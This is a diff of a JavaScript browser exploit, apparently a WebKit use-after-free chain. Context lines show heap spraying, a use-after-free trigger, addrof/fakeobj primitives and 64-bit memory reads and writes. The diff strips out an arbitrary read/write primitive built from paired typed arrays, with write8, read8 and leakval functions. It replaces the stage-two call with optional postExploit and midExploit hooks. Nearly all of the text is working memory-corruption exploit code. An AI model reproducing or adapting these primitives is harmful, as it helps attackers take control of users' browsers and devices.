@@ -33,11 +33,6 @@ var g_rows2 = '2px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "2px";
 var g_round = 1;
 var g_input = null;
 var guess_htmltextarea_addr = new Int64("0x2031b00d8");
-var master_b = new Uint32Array(2);
-var slave_b =  new Uint32Array(2);
-var slave_addr;
-var slave_buf_addr;
-var master_addr;
 function setupRW() {
 	for (let i = 0; i < g_arr_ab_3.length; i++) {
 		if (g_arr_ab_3[i].length > 0xff) {
@@ -86,61 +81,8 @@ function setupRW() {
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
 	debug_log("[+] Succesfully got addrof/fakeobj");
-	var leak_slave = addrof(slave_b);
-	var slave_addr = read64(leak_slave.add(0x10));
-	og_slave_addr = new int64(slave_addr.low32(), slave_addr.hi32());
-	var leak_master = addrof(master_b);
-	write64(leak_master.add(0x10), leak_slave.add(0x10));
-	var prim = {
-		write8: function(addr, val) {
-			master_b[0] = addr.low;
-			master_b[1] = addr.hi;
-			if(val instanceof int64) {
-				slave_b[0] = val.low;
-				slave_b[1] = val.hi;
-			}
-			else {
-				slave_b[0] = val;
-				slave_b[1] = 0;
-			}
-			master_b[0] = og_slave_addr.low;
-			master_b[1] = og_slave_addr.hi;
-		},
-		write4: function(addr, val) {
-			master_b[0] = addr.low;
-			master_b[1] = addr.hi;
-			slave_b[0] = val;
-			master_b[0] = og_slave_addr.low;
-			master_b[1] = og_slave_addr.hi;
-		},
-		read8: function(addr) {
-			master_b[0] = addr.low;
-			master_b[1] = addr.hi;
-			var r = new int64(slave_b[0], slave_b[1]);
-			master_b[0] = og_slave_addr.low;
-			master_b[1] = og_slave_addr.hi;
-			return r;
-		},
-		read4: function(addr) {
-			master_b[0] = addr.low;
-			master_b[1] = addr.hi;
-			var r = slave_b[0];
-			master_b[0] = og_slave_addr.low;
-			master_b[1] = og_slave_addr.hi;
-			return r;
-		},
-		leakval: function(val) {
-			g_ab_slave.leakme = val;
-			master_b[0] = g_jsview_butterfly.low32() - 0x10;
-			master_b[1] = g_jsview_butterfly.hi32();
-			var r = new int64(slave_b[0], slave_b[1]);
-			master_b[0] = og_slave_addr.low;
-			master_b[1] = og_slave_addr.hi;
-			return r;
-		},
-	};
-	window.prim = prim;
-	setTimeout(stage2, 1000);
+	if(window.postExploit)
+		window.postExploit();
 }
 function read(addr, length) {
 	for (let i = 0; i < 8; i++)
@@ -350,6 +292,8 @@ function sprayStringImpl(start, end) {
 }
 function go() {
 	sprayHTMLTextArea();
+	if(window.midExploit)
+		window.midExploit();
 	g_input = input1;
 	prepareUAF();
 }
